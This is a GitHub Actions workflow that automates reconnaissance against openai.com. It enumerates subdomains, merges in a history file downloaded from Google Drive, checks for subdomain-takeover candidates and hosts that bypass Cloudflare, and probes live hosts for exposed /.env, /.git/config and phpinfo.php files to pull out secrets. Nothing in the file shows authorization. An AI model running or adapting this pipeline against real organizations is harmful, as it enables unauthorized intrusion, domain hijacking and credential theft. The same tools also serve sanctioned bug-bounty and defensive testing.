name: Apex-Maximum-oombi
on:
  workflow_dispatch:

jobs:
  recon-marathon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Hunting Tools
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/haccer/subjack@latest
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Comprehensive Subdomain Discovery
        run: |
          mkdir -p output
          # 1. Passive Discovery (Finding every subdomain OpenAI has registered)
          subfinder -d openai.com -all -silent > output/all_subs.txt
          
          # 2. Merge with your History file subdomains
          curl -L "https://docs.google.com/uc?export=download&id=1vD2GpVHiMlR1wmoQfxcZfIpKeCRuadZx" -o history.txt
          grep -oP '(?<=://)[a-zA-Z0-9.-]+\.openai\.com' history.txt >> output/all_subs.txt
          sort -u output/all_subs.txt -o output/all_subs.txt

      - name: Subdomain Takeover & Live Check
        run: |
          # 3. Check for dangling CNAMEs (Takeover high potential)
          subjack -w output/all_subs.txt -t 100 -timeout 30 -o output/takeover.txt -ssl || true
          
          # 4. Filter for 'Live' subdomains that bypass Cloudflare
          # We look for servers that don't return "cloudflare" in the headers
          httpx -l output/all_subs.txt -silent -status-code -title -server -o output/live_targets.txt

      - name: Deep Secret Extraction (JS Fuzzing)
        run: |
          # 5. Extract JS files from live targets and look for API Keys
          # Using httpx to find all .js endpoints
          cat output/live_targets.txt | awk '{print $1}' | httpx -path "/.env,/.git/config,/phpinfo.php,/robots.txt" -status-code -silent >> output/leaks_found.txt || true
          
      - name: Upload Everything
        uses: actions/upload-artifact@v4
        with:
          name: maximum-recon-results
          path: output/
          
